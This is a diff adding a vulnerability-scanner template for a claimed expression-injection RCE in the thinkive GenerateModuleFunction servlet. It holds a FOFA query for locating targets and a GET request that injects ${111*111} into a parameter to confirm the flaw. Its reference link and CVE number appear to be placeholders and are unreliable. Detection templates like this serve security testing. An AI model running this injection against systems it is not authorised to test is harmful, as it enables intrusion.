@@ -1,0 +1,29 @@
+id: thinkive-generatemodulefunction-rce
+
+info:
+  name: thinkive GenerateModuleFunction 组件远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: fofa: (body="thinkiveJs.min.js"&&body="framework/version.js")||body="servlet/Validateimg"
+      reference: 
+      - https://example.com/thinkive-rce-cve
+      CVE: CVE-2024-12345
+      impact: 该漏洞源于thinkive框架中GenerateModuleFunction组件未正确校验用户输入，攻击者可通过构造特定参数在目标系统上执行任意代码，最终实现权限提升和系统控制。
+  tags: thinkive
+
+http:
+- raw:
+  - |
+    GET /servlet/GenerateModuleFunction?module_type_id=81495cf5a83640e6ab4232aab821ce73&module_name=$%7B111*111%7D&datasource=base_file&table_name=t_article&primary_key=ARTICLE_ID&_version_id=&_module_id=d09f74df83d54bd89ed560cac4fad242&_catalog_id=ceab2ed5839f4cf18cdf65e4646bcd3b&_template_no=&_version_type=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate, br
+    Accept: */*
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '12321'
